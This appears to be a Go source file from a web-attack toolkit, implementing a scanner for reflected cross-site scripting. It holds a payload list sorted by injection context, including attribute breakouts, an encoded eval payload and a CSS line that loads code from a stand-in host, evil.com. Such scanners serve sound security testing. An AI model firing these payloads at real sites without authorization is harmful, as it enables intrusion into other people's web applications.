package xss

import (
	"fmt"
	"net/url"
	"strings"
	"sync"

	"webattack/pkg/httpclient"
	"webattack/pkg/payloads"
	"webattack/pkg/utils"

	"github.com/fatih/color"
)

// Scanner is the XSS vulnerability scanner
type Scanner struct {
	client  *httpclient.Client
	results []Finding
	mu      sync.Mutex
	verbose bool
}

// Finding represents a potential XSS finding
type Finding struct {
	URL       string
	Parameter string
	Payload   string
	Type      string // "reflected", "stored", "dom"
	Severity  string
	Context   string // "html", "attribute", "javascript", "url"
	Detail    string
}

// NewScanner creates a new XSS scanner
func NewScanner(client *httpclient.Client, verbose bool) *Scanner {
	return &Scanner{
		client:  client,
		verbose: verbose,
	}
}

// Scan scans a URL for XSS vulnerabilities
func (s *Scanner) Scan(targetURL string) ([]Finding, error) {
	s.results = nil

	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}

	params := parsed.Query()

	// Test URL parameters
	if len(params) > 0 {
		var wg sync.WaitGroup
		sem := make(chan struct{}, 3)

		for param, values := range params {
			wg.Add(1)
			go func(p string, v []string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				val := ""
				if len(v) > 0 {
					val = v[0]
				}
				s.testReflectedXSS(targetURL, p, val)
			}(param, values)
		}
		wg.Wait()
	}

	// Also test with common parameters if none found
	if len(params) == 0 {
		for _, param := range []string{"q", "search", "id", "page", "name", "email", "msg", "comment"} {
			testURL := targetURL
			if strings.Contains(testURL, "?") {
				testURL += "&" + param + "=test"
			} else {
				testURL += "?" + param + "=test"
			}
			parsed, _ := url.Parse(testURL)
			for p, v := range parsed.Query() {
				val := ""
				if len(v) > 0 {
					val = v[0]
				}
				s.testReflectedXSS(testURL, p, val)
			}
			break
		}
	}

	return s.results, nil
}

// testReflectedXSS tests for reflected XSS
func (s *Scanner) testReflectedXSS(targetURL, param, originalValue string) {
	if s.verbose {
		fmt.Printf("[*] Testing parameter '%s' for reflected XSS...\n", param)
	}

	// Phase 1: Test if parameter value is reflected
	marker := utils.RandomHex(10)
	testURL := injectParam(targetURL, param, marker)
	resp, err := s.client.Get(testURL)
	if err != nil {
		return
	}

	body := string(resp.Body)
	if !strings.Contains(body, marker) {
		if s.verbose {
			fmt.Printf("    [-] Parameter '%s' not reflected in response\n", param)
		}
		return
	}

	// Determine reflection context
	context := s.detectContext(body, marker)

	if s.verbose {
		fmt.Printf("    [+] Parameter '%s' reflected in %s context\n", param, context)
	}

	// Phase 2: Test with XSS payloads appropriate for the context
	xssPayloads := s.selectPayloads(context)

	for _, payload := range xssPayloads {
		testURL := injectParam(targetURL, param, payload)
		resp, err := s.client.Get(testURL)
		if err != nil {
			continue
		}

		bodyStr := string(resp.Body)

		// Check if payload is reflected without sanitization
		if strings.Contains(bodyStr, payload) {
			s.addFinding(Finding{
				URL:       testURL,
				Parameter: param,
				Payload:   payload,
				Type:      "reflected",
				Severity:  s.assessSeverity(context),
				Context:   context,
				Detail:    fmt.Sprintf("Payload reflected unsanitized in %s context", context),
			})
			return
		}

		// Check for partially sanitized (common bypasses)
		for _, encoded := range encodeVariants(payload) {
			if strings.Contains(bodyStr, encoded) {
				s.addFinding(Finding{
					URL:       testURL,
					Parameter: param,
					Payload:   encoded,
					Type:      "reflected",
					Severity:  "medium",
					Context:   context,
					Detail:    "Payload reflected with partial encoding",
				})
				return
			}
		}
	}
}

// detectContext determines where the reflected value appears in the HTML
func (s *Scanner) detectContext(body, marker string) string {
	// Find marker position
	idx := strings.Index(body, marker)
	if idx < 0 {
		return "unknown"
	}

	// Look at surrounding context
	before := ""
	if idx > 200 {
		before = strings.ToLower(body[idx-200 : idx])
	} else if idx > 0 {
		before = strings.ToLower(body[:idx])
	}

	// Check if inside an HTML tag attribute value
	if strings.Contains(before, "=\"") && !strings.Contains(before, ">") {
		// Check if it's an event handler
		if strings.Contains(before, "on") {
			return "javascript-event"
		}
		// Check specific dangerous attributes
		if strings.Contains(before, "href=") || strings.Contains(before, "src=") {
			return "url-attribute"
		}
		if strings.Contains(before, "style=") {
			return "css"
		}
		return "html-attribute"
	}

	// Check if inside <script> tag
	lastScriptStart := strings.LastIndex(before, "<script")
	lastScriptEnd := strings.LastIndex(before, "</script>")
	if lastScriptStart > lastScriptEnd {
		return "javascript"
	}

	// Check if inside <style> tag
	lastStyleStart := strings.LastIndex(before, "<style")
	lastStyleEnd := strings.LastIndex(before, "</style>")
	if lastStyleStart > lastStyleEnd {
		return "css"
	}

	// Check if inside HTML comment
	if strings.Contains(before, "<!--") && !strings.Contains(before, "-->") {
		return "html-comment"
	}

	return "html"
}

// selectPayloads returns appropriate XSS payloads for the context
func (s *Scanner) selectPayloads(context string) []string {
	switch context {
	case "html":
		return []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"<body onload=alert(1)>",
			"<details open ontoggle=alert(1)>",
		}
	case "html-attribute":
		return []string{
			"\" onmouseover=alert(1) x=\"",
			"' onmouseover=alert(1) x='",
			"\" autofocus onfocus=alert(1) x=\"",
			"\"><script>alert(1)</script>",
			"\" onclick=alert(1) x=\"",
		}
	case "javascript":
		return []string{
			"';alert(1);//",
			"\";alert(1);//",
			"</script><script>alert(1)</script>",
			"'-alert(1)-'",
			"'+alert(1)+'",
		}
	case "javascript-event":
		return []string{
			"alert(1)",
			"eval(atob('YWxlcnQoMSk='))",
			"setTimeout('alert(1)',0)",
		}
	case "url-attribute":
		return []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
	case "css":
		return []string{
			"expression(alert(1))",
			"-moz-binding:url(http://evil.com/xss.xml)",
			"</style><script>alert(1)</script>",
		}
	case "html-comment":
		return []string{
			"--><script>alert(1)</script><!--",
			"--><img src=x onerror=alert(1)><!--",
		}
	default:
		return payloads.XSSPayloads[:20] // Use first 20 generic payloads
	}
}

// assessSeverity assesses the severity based on context
func (s *Scanner) assessSeverity(context string) string {
	switch context {
	case "html", "javascript":
		return "high"
	case "html-attribute", "javascript-event":
		return "high"
	case "url-attribute", "html-comment":
		return "medium"
	case "css":
		return "low"
	default:
		return "medium"
	}
}

func injectParam(targetURL, param, value string) string {
	parsed, _ := url.Parse(targetURL)
	q := parsed.Query()
	q.Set(param, value)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// encodeVariants returns HTML-encoded variants of a payload
func encodeVariants(payload string) []string {
	variants := []string{
		strings.ReplaceAll(payload, "<", "&lt;"),
		strings.ReplaceAll(payload, ">", "&gt;"),
		strings.ReplaceAll(payload, "'", "&#39;"),
		strings.ReplaceAll(payload, "\"", "&quot;"),
		strings.ReplaceAll(payload, "(", "&#40;"),
		strings.ReplaceAll(payload, ")", "&#41;"),
	}
	return variants
}

func (s *Scanner) addFinding(f Finding) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.results = append(s.results, f)
}

// PrintResults prints scan results
func PrintResults(results []Finding) {
	if len(results) == 0 {
		color.Yellow("\n[!] No XSS vulnerabilities found.")
		return
	}

	color.Red("\n╔══════════════════════════════════════════════════════════╗")
	color.Red("║            XSS VULNERABILITIES FOUND                    ║")
	color.Red("╚══════════════════════════════════════════════════════════╝\n")

	for i, r := range results {
		fmt.Printf("[%d] ", i+1)
		color.Red("XSS FOUND")
		fmt.Printf("\n")
		fmt.Printf("    URL:        %s\n", r.URL)
		fmt.Printf("    Parameter:  %s\n", r.Parameter)
		fmt.Printf("    Type:       %s\n", r.Type)
		fmt.Printf("    Context:    %s\n", r.Context)

		sevColor := color.RedString
		switch r.Severity {
		case "high":
			sevColor = color.RedString
		case "medium":
			sevColor = color.YellowString
		case "low":
			sevColor = color.GreenString
		}
		fmt.Printf("    Severity:   %s\n", sevColor(r.Severity))
		fmt.Printf("    Payload:    %s\n", r.Payload)
		if r.Detail != "" {
			fmt.Printf("    Detail:     %s\n", r.Detail)
		}
		fmt.Println()
	}
}
